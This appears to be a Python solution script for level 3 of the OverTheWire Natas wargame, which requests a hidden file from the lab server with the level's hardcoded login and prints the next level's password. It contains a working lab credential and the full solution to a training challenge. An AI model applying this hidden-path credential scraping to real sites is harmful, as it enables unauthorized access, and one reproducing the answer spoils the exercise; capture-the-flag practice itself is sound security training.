import requests

url = "http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt"
r = requests.get(url, auth=('natas3','sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14'))
password = r.text[7:]
print('The password for natas4 is: '+r.text[7:])
